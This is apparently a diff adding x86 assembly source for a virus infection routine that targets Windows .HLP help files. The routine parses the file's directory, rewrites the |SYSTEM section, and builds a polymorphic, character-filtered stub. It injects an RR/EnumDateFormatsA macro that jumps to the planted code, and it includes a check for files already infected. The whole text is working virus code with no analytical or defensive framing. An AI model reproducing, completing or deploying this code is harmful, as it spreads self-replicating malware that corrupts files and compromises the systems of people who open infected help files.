@@ -1,0 +1,313 @@
+infect_hlp:
+       call __delta
+  __delta:
+       pop ebp
+       sub ebp, ofs __delta
+
+buffer    equ 0                                ;stack frame
+old_ofs   equ 4
+old_sz    equ 8
+patch1    equ 12
+wsize3    equ 16
+
+mainhdr   equ 0                                ;buffer structure
+pagedir   equ 10h
+syshdr    equ 210h
+build     equ 225h
+
+       add esp, -wsize3                        ;infect HLP files...
+       call fopen_rw
+       jc __error000
+       mov ebx, eax
+
+       push 64*1024
+hlpmemalloc equ $-4
+       push 040h
+       call [ebp+ofs LocalAlloc]
+
+       mov [esp+buffer], eax
+       mov edx, eax                            ;esi=buffer.mainhdr
+       mov esi, eax
+       push 10h
+       pop ecx
+       call fread                               ;read 10h of header
+       jc __free
+
+       lodsd
+       xor eax, 035f3fh                        ;hlp signature?
+       jnz __free
+
+       lodsd
+       lea edx, [eax+37h]                      ;edx=directory offset
+       call fseek
+
+       mov ecx, 200h
+       lodsd
+       lodsd                                   ;esi=buffer.pagedir
+       mov edx, esi
+       call fread
+
+       mov ecx, eax
+  __search:
+       dec ecx
+       jz __free
+       cmp dwo [esi+ecx], 'SYS|'
+       jnz __search
+       cmp dwo [esi+ecx+4], 'MET'
+       jnz __search
+
+       mov eax, [esi-4]                        ;eax=end of file
+       xchg eax, [esi+ecx+8]                   ;section code = end of file
+       xchg eax, edx
+       push edx
+       call fseek
+
+       sub esi, -(syshdr-pagedir)
+       mov ecx, 15h
+       mov edx, esi
+       call fread                               ;read sys hdr
+
+       pop edx
+       mov ecx, [esi]
+       push 15h
+       pop eax
+       sub ecx, eax
+       add edx, eax
+       mov [esp+old_ofs], edx
+       mov [esp+old_sz], ecx                   ;save old code position/size
+
+       mov edi, [esp.buffer]
+       sub edi, -build
+       lea esi, [ebp+(ofs hlp1_s)]
+       lea eax, [edi+(ofs _size-ofs hlp1_s)]
+       mov [esp.patch1], eax
+
+       push hlp1_sz
+       pop ecx
+       rep movsb
+
+       push edi                                ;edi=buffer
+
+       mov esi, 12345678h
+  dropper_size equ dwo $-4
+       add esi, (ofs pepatch_-ofs pepatch)+3
+       and esi, not 011b                    ;align2dword
+       lea ecx, [ebp+(ofs buffer_)]
+       mov [ecx+(ofs pushtotal-ofs init)], esi
+       add esi, ecx
+
+       mov eax, "SRQP"
+       stosd
+       mov eax, "WVUT"
+       stosd
+
+       push ebx
+  __next:
+       add esi, -4
+       mov eax, [esi]
+       call check
+       test edx, edx                           ;can make it directly?
+       jnz __ext
+       mov al, 12h                             ;push ?
+     org $-1
+       push 12345678h
+     org $-4
+       stosb
+       mov eax, [esi]
+       stosd
+       jmp __done_
+  __ext:
+       push edx
+       call rnd
+       mov ebx, edx
+       pop edx
+       and ebx, 011b
+       mov al, 0b8h                            ;mov eax, ?
+       or al, bl
+       stosb
+       mov eax, [esi]
+       xor eax, edx
+       stosd
+       mov al, 35h                             ;xor eax, ?
+       test ebx, ebx
+       jz __eax
+       mov ax, 0f081h
+       or ah, bl
+       stosw
+       jmp __reg
+  __eax:
+       stosb
+  __reg:
+       mov eax, edx
+       stosd
+       mov al, 50h                             ;push eax
+       or al, bl
+       stosb
+  __done_:
+       cmp esi, ecx
+       jne __next
+       pop ebx
+
+       pop eax
+       mov ecx, edi
+       sub ecx, eax                            ;ecx=poly code
+
+     mov eax, ecx
+     shr eax, 16
+     test eax, eax
+     jnz __free
+
+       push ecx
+       add ecx, (ofs hlp1_e-ofs p1)+(ofs hlp2_e-ofs hlp1_e)
+       mov eax, [esp.patch1+4]
+       mov wo [eax], cx                        ;patch macro size
+       lea esi, [ebp+ofs hlp1_e]
+       push hlp2_sz
+       pop ecx
+       rep movsb                               ;copy end macro
+       pop eax
+
+       mov esi, [esp.buffer]
+       sub esi, -syshdr
+       add eax, hlp2_e-hlp1_s
+       add [esi], eax
+       add [esi+4], eax                        ;fix syshdr size
+
+       mov esi, edi
+       mov ecx, [esp.old_sz]
+       sub eax, ecx                            ;old script too large?
+       jbe __free
+       mov edx, [esp.old_ofs]
+       call fseek
+       mov edx, esi
+       call fread                               ;read old code
+
+       cmp [esi+4], "`(RR"
+       je __free                               ;probably already infected
+
+       push ebp
+       mov ebp, [esp.buffer+4]                   ;ebp=buffer
+       lea ecx, [edi+eax]
+       sub ecx, ebp                            ;ecx=our size
+       add ecx, -syshdr
+       mov edx, [ebp.mainhdr+12]
+       call fseek
+       lea edx, [ebp.syshdr]
+       pop ebp
+       call fwrite                              ;write our code
+
+       push eax
+       sub edx, edx
+       call fseek
+       pop eax
+       mov edx, [esp.buffer]
+       mov esi, edx
+       push 10h
+       add [edx.mainhdr+12], eax
+       pop ecx
+       call fwrite                              ;write main header
+
+       mov edx, [esi.mainhdr+4]
+       sub edx, -37h
+       call fseek
+       mov ecx, 200h
+       lea edx, [esi+pagedir]
+       call fwrite                              ;write directory
+
+  __free:
+       push dwo [esp+buffer]
+       call [ebp+ofs LocalFree]
+
+       call fclose                              ;close file
+  __error000:
+       add esp, wsize3
+       ret
+
+
+hlp1_s = $
+       dw 4
+       dw (ofs _label1-ofs _label2)
+_label2 = $
+;       db "RR(`USER32.DLL',`EnumWindows',`SU')", 0
+       db "RR(`KERNEL32.DLL',`EnumDateFormatsA',`SUU')", 0
+_label1 = $
+
+       dw 4
+_size  dw 0
+p1     = $
+;       db "EnumWindows(`"
+       db "EnumDateFormatsA(`"
+hlp1_e = $
+hlp1_sz = hlp1_e-hlp1_s
+       jmp esp
+;       db "',0)", 0
+       db "',2048,2)", 0
+hlp2_e = $
+hlp2_sz = hlp2_e-hlp1_e
+
+
+check  proc
+       call checkv
+       jc __again_1
+       sub edx, edx
+       ret
+  __again_1:
+       push ebx
+       mov ebx, eax
+  __again:
+       mov eax, ebx
+       call rnd
+       xor eax, edx
+       call checkv                             ;eax was validated?
+       jc __again
+       xchg eax, edx                           ;edx is valid modifier?
+       call checkv
+       jc __again
+       xchg edx, eax
+       pop ebx
+       ret
+check  endp
+
+
+rnd    proc
+       call __2
+       dd 12345678h
+  __2:
+       pop edx
+       sub [edx], 12345678h
+     org $-4
+v2     dd 87654321h
+       mov edx, [edx]
+       xor [ebp+(ofs v2)], edx       ;get rnd number
+       ret
+rnd    endp
+
+
+checkv proc
+       pusha
+       push 4
+       pop ecx
+  __1:
+       cmp al, ' '
+       jbe __error
+       cmp al, 0f0h
+       ja __error
+       cmp al, '"'
+       jz __error
+       cmp al, "'"
+       jz __error
+       cmp al, "`"
+       jz __error
+       cmp al, "\"
+       jz __error
+       ror eax, 8                              ;check for invalid characters
+       loop __1                                ;for hlp script
+       clc
+       mov cl, 12h
+     org $-1
+  __error:
+       stc
+       popa
+       ret
+checkv endp
+
